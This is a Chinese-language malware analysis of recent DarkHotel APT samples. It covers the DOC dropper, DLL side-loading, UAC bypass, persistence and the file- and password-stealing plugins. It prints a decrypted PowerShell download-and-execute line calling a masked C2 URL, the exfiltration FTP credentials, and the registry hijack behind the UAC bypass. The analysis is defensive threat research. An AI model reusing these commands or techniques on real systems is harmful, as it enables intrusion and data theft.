> 原文链接: https://www.anquanke.com//post/id/107813 


# DarkHotel APT团伙新近活动的样本分析


                                阅读量   
                                **122694**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t0152354aeca42b5bc1.jpg)](https://p4.ssl.qhimg.com/t0152354aeca42b5bc1.jpg)

## 背景

Darkhotel（APT-C-06）是一个长期针对企业高管、国防工业、电子工业等重要机构实施网络间谍攻击活动的APT组织。2014年11月，卡巴斯基实验室的安全专家首次发现了Darkhotel APT组织，并声明该组织至少从2010年就已经开始活跃，目标基本锁定在韩国、中国、俄罗斯和日本。360威胁情报中心对该团伙的活动一直保持着持续跟踪，而在最近几个月我们再次跟踪到该团伙发起的新的攻击活动。



## 来源

2018年2月中旬，360威胁情报中心在对恶意代码日常跟踪的过程中发现疑似定向攻击的APT样本，通过对该样本的深入分析，利用威胁情报中心数据平台，确认其与长期跟踪的DarkHotel APT团伙存在关联，并且结合威胁情报数据挖掘到了该团伙更多的样本，对该团伙近年来使用的多个版本的恶意代码进行了分析对比，梳理了样本演化过程。



## 样本分析

监控到的样本是一个DOC样本（letter.doc），该样本会释放的一批白利用文件，其中一个白利用文件是谷歌Chrome浏览器组件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0190389478119798b0.png)

白利用文件释放到以下目录：

%temp%\taskhost.exe

%temp%\chrome_frame_helper.dll



taskhost.exe的签名信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b384f322ddba9856.png)

而chrome_frame_helper.dll文件被白文件加载起来后，会从自身资源释放出一个和0xa9异或后的PowerShell脚本，再解密后执行。

加密前的PowerShell脚本：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010c07d2c162c36a18.png)

使用0xA9异或解密后的PowerShell脚本文件如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c3711c500ba6cdb7.png)

[![](https://p4.ssl.qhimg.com/t018598bcfb4a270e57.png)](https://p4.ssl.qhimg.com/t018598bcfb4a270e57.png)

将混淆后的PowerShell脚本解密后如下：

[![](https://p0.ssl.qhimg.com/t010d2b5bc7b3a50584.png)](https://p0.ssl.qhimg.com/t010d2b5bc7b3a50584.png)

IEx($url=’http://********ents.com/melon322/search.php?name=180322-16′;$key=’Lq5846yGptowMcuLyQBcdw+vgnKl7aA0lTBUV4QkShs=’; $wc = New-Object Net.WebClient; $wc.Headers[“User-Agent”] = “Mozi11a/4.0″; $a=$wc.DownloadString($url);$a) ”



### Dropper

解密后的PowerShell脚本就是一个Dropper，该脚本会将UserAgent设置为Mozi11a/4.0然后去下载下一步的PowerShell脚本执行：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016018972a04aeaa27.png)

再次下载回来的PowerShell脚本也是经过混淆的，去混淆分析整理后的功能主要是绕过UAC后去下载msfte.dll到系统的system32目录下，下载NTWDBLIB.DLL文件到系统的system32目录下，通过cliconfg.exe白利用加载NTWDBLIB.DLL来修改msfte.dll的宿主服务WSearch成自动开启状态，实现msfte.dll的持久化驻留主要功能如下：

**Bypass UAC**

样本首先通过修改注册表HKCU:\Software\Classes\exefile\shell\runas\command的值，指向需要运行的进程路径（PowerShell），再运行sdclt.exe触发执行起来的进程以实现Bypass UAC：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017318ca1116532efa.png)

**劫持系统模块**

Bypass UAC后的PowerShell脚本会伪装UserAgent后去下载msfte.dll和NTWDBLIB.DLL这两个文件，然后通过AES解密到%temp%目录下，密钥为’Lq5846yGptowMcuLyQBcdw+vgnKl7aA0lTBUV4QkShs=’：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01eda5eb49ed5270fc.png)

使用PowerShell-Suite模块分别把temp目录下的msfte.dll和NTWDBLIB.DLL移动到system32目录下（因为当前执行的powershell的进程是bypass uac起来的，所以可以成功移动到系统目录下）。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01fc43a4738eabdc50.png)

%windir%\System32\cliconfg.exe文件会默认加载system32目录下的NTWDBLIB.dll文件，这样通过执行cliconfg.exe来执行NTWDBLIB.DLL的代码，而该DLL的代码主要是修改Wsearch服务的状态为自动启动状态，实现msfte.dll的长久驻留系统。

[![](https://p2.ssl.qhimg.com/t01a9942448581dcf1c.png)](https://p2.ssl.qhimg.com/t01a9942448581dcf1c.png)

**传输加密后进程列表到WEB服务器**

脚本还会将进程列表加密后传输到WEB服务器：

[![](https://p0.ssl.qhimg.com/t01efaecef25e5376f7.png)](https://p0.ssl.qhimg.com/t01efaecef25e5376f7.png)

**上传msfte.dll文件信息**

最后将msfte.dll的文件信息加密上传，确认mstfe.dll是否修改成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a9e3ca6ba7a7d608.png)



### NTWDBLIB.dll分析

该DLL的主要作用是把WSearch服务（mstfe.dll的宿主服务）设置成自动启动状态，这样mstfe.dll会随系统启动而启动，然后重启服务，加载劫持的DLL文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0165b9aa29fe91cce8.png)

还会检测AVG及AVAST杀软：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ceb6511586faa34f.png)

如果存在这两类杀软则删除自身：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e2b308eb10bb5f72.png)

生成对应自删除脚本并执行：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01725af9402e159e0c.png)



### msfte.dll分析

下载回来的msfte.dll成功释放到system32目录后，重启系统（随之启动WSerch服务）会默认加载这个DLL文件，实现自启动，代码中会判断是否是以下几个进程加载该DLL，如果是才会执行恶意代码：

[![](https://p3.ssl.qhimg.com/t01256390a3387ff61f.png)](https://p3.ssl.qhimg.com/t01256390a3387ff61f.png)

恶意代码执行后先获取Payload的下载地址：

[![](https://p1.ssl.qhimg.com/t01fa1b1152d1b0a58b.png)](https://p1.ssl.qhimg.com/t01fa1b1152d1b0a58b.png)

LoadConfig函数会先判断同目录下有没有Config.ini，如果没有，就会从自身解密出Payload的下载地址：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a065fdb445f731f4.png)

解密后的数据内容，该样本的payload的下载地址为：

http://******ld.com/strawberry322/config.php

http://******00.com/strawberry322/config.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019e0615e4b79e7311.png)

拼接出下载地址：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017ff176704de0fdae.png)

下载回来的文件是一个图片，附加数据在图片的后面：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019ee5b549292a5ccd.png)

[![](https://p0.ssl.qhimg.com/t017215fa6d753fb581.jpg)](https://p0.ssl.qhimg.com/t017215fa6d753fb581.jpg)

正常图片和捆绑了数据的图片大小对比：

[![](https://p2.ssl.qhimg.com/t01d80cd49d64eaee24.png)](https://p2.ssl.qhimg.com/t01d80cd49d64eaee24.png)

最后从图片的附加数据种解密出Payload：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01eb65a8bf33857a79.png)

解密函数中会首先校验下载数据的合法性，然后再执行解密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010c06b7476bf97106.png)

最后通过异或/减获取到解密后的PE文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a69975ef0cc01a25.png)

解密后的数据如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01390a88c417194d65.png)

在内存种反射加载解密后的PE文件：

[![](https://p1.ssl.qhimg.com/t01ba6bdecc64e2f5f5.png)](https://p1.ssl.qhimg.com/t01ba6bdecc64e2f5f5.png)



### 主功能DLL（RetroMain）分析

msfte.dll下载解密图片中的数据得到的DLL文件即为主远控DLL，该远控的主要功能逻辑除了命令处理模块外，还会启动两个线程分别用于插件安装，及信息窃取：[![](https://p2.ssl.qhimg.com/t01b05a861a74373136.png)](https://p2.ssl.qhimg.com/t01b05a861a74373136.png)

**字符串加密算法**

样本中使用的相关字符集函数名称都行了加密，加密的方式包含以下三类：

第一类通过一个预置的64字节的字典异或获取字符串的值，该类解密算法主要用于解密动态函数名及部分重要的字符串：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017cde73ca78d847eb.png)

第二类加密算法为单字节异或/加减，主要用于部分重要数据结构的解密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0175f3c4da88af2fd8.png)

部分解密后的数据如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f698fd80a61e6d50.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e4e74dfa068ee267.png)

**启动执行插件的线程**

主控DLL启动一个线程并通过上述的第二类解密算法获取对应的插件名及插件对应的目录，插件路径为%ALLUSERSPROFILE%\GE4FH28Q，支持的插件如红框所示：

[![](https://p2.ssl.qhimg.com/t01f97ad227134ea879.png)](https://p2.ssl.qhimg.com/t01f97ad227134ea879.png)

再依次判断目录下的对应插件，并加载执行：

[![](https://p1.ssl.qhimg.com/t01cb0d81892597019f.png)](https://p1.ssl.qhimg.com/t01cb0d81892597019f.png)

之后获取系统相关信息，主要为系统版本及操作系统当前的相关状态信息（如路由表，进程列表等）：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013b80b947b1cb0ddd.png)

fun_CollectinfoBycmd函数中通过CMD命令获取操作系统状态：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012fa23010c3b7e858.png)<br>
部分收集的信息如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017d3aa3098d79408a.png)

紧接着开启第二个线程用于窃取用户数据，窃取的主要文件后缀有：

“.txt”;”.tmp”;”.dat”;”.dot”;”.rar”;

然后提交到如下URL：

http://******rld.com/strawberry322/config.php?p=H&amp;inst=2749&amp;name=180322-16

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012c36957744106ba6.png)

最后进入fun_shell_Dispatch函数，该函数通过POST的方式提交用户信息（地址：http://******rld.com/strawberry322/config.php?p=H&amp;inst=0538&amp;name=180322-16），并返回对应的攻击指令，且提交数据的前八个字节预留，用于校验：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cc483340e99b547f.png)

singal前6位的数据通过时间和随机数相加取余获得，第7、8位为前6位和的校验值：

[![](https://p5.ssl.qhimg.com/t01b9b5d5d8eb2b539d.png)](https://p5.ssl.qhimg.com/t01b9b5d5d8eb2b539d.png)

之后获取服务端的指令执行相应的功能，支持的功能如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e1a09547f2c0a24f.png)



### 插件分析

样本的主控模块（RetroMain）除了实现远程命令处理等功能以外主要以插件形式执行主要的模块功能，样本使用了多个插件，主要的插件功能如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b63b0d8dd9153d6a.png)



相关插件的具体功能分析如下：

**Ctfmon.exe/wqstec.exe**

这两个exe为轻量级的信息收集Loader，通过执行以下CMD命令收集系统相关信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015dc52032902b6eaa.png)



通过cmd.exe /c dir /x /s /a遍历目录文件信息，获取指定后缀的文件doc，xls，txt，ppt，eml，doc，并通过WinRAR加密压缩，对应的密码为：p1q2w3e4r!@#$????1234****：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0190e46567b2540ebd.png)

收集的信息及对应的打包文件通过FTP上传，FTP服务器IP地址：119.xx.xx.32

用户名：unknown

密码：wodehaopengyou123!@#

[![](https://p4.ssl.qhimg.com/t01b3e3d09f33bcf666.png)](https://p4.ssl.qhimg.com/t01b3e3d09f33bcf666.png)

ctfmon_ donot.exe

该插件主要的功能是收集浏览器密码，然后经过AES加密存储到本地，供攻击者读取：[![](https://p5.ssl.qhimg.com/t01450d222b2b81ec22.png)](https://p5.ssl.qhimg.com/t01450d222b2b81ec22.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0176cd50932b0cdb21.png)

根据时间生成密钥，将生成的密钥字符串放到文件名里，最后把窃取的结果通过生成的密钥进行AES加密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015112399141ce8b11.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01df147ecb1b016fe8.png)

记录的数据格式是将每条AES加密后的数据进行Base64编码，再存储到文件中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0187b6bb7455ff2aea.jpg)

**Dmext.dll/cryptcore.dll**

该模块为一个Loader，用于下载对应的metsrv.dll，下载回来的DLL为Metasploit生成，对应的C&amp;C地址通过异或加减操作解密：

[![](https://p0.ssl.qhimg.com/t01351db4193e74208f.png)](https://p0.ssl.qhimg.com/t01351db4193e74208f.png)

对应的IP，Port如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01315a538d938f7afe.png)

直接下载后通过线程函数启动：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01608561b411e1fa46.png)

**aucodhw.dll**

该插件的DLLMain中会先判断加载模块的进程是不是这3个进程：

SearchFilterHost.exe

SearchProtocolHost.exe

SearchFilterHost.exeUp

如果是，就先删除记录文件路径的配置文件%ALLUSERSPROFILE%/FW5GH1AO.lck，然后创建窗口线程，实现窗口消息循环：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c68794f7f7a984be.png)

随后在窗口线程里创建一个名为lua的窗口，并设置对应的lpfunWndProc函数，该函数为对应的文件窃取的主函数。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0154a9a8ca2fbe72cf.png)

该模块为对应的文件窃取模块，内部解密的配置元组如下所示，标记了窃取的文件类型，及对应的文件保存格式等信息：

[![](https://p2.ssl.qhimg.com/t0163052b1706f59a57.png)](https://p2.ssl.qhimg.com/t0163052b1706f59a57.png)

解密前的数据如下，前5个字节是标志，第5个字节是长度，后面是数据：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ce9fa27ad447d7d4.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0148372784ca87c510.png)

解密算法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0154cf3833b0c0690c.png)

最后判断是否有移动磁盘，有的时候，会60秒执行一次收集函数，没有的时候180秒执行一次：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018a47201bede3b867.png)

样本运行之后会有专门的线程用于监控可移动磁盘（DRIVE_REMOVABLE）的插入，并窃取其中的重要文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01723bb891db68a54a.png)



收集比较特定后缀的文件，文件后缀包含（.txt,.hwp,.doc,.docx,.xls,.xlsx,.ppt,.pptx）：

[![](https://p3.ssl.qhimg.com/t01f38ba690aa773009.png)](https://p3.ssl.qhimg.com/t01f38ba690aa773009.png)

[![](https://p4.ssl.qhimg.com/t017518dd3c375eb2bc.png)](https://p4.ssl.qhimg.com/t017518dd3c375eb2bc.png)

最终把文件加密存到%ALLUSERSPROFILE%\AU50FE1D，等待攻击者提取。

**sdihlp.dll**

sdihlp.dll为该样本使用的截屏模块，模块启动后创建互斥量Mutexhawaiank，之后开启主线程：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01946fc29c8d0ad998.png)

随后创建一个名为aul的窗口，并设置对应的lpfunWndProc函数，该函数为对应的屏幕截屏主函数：

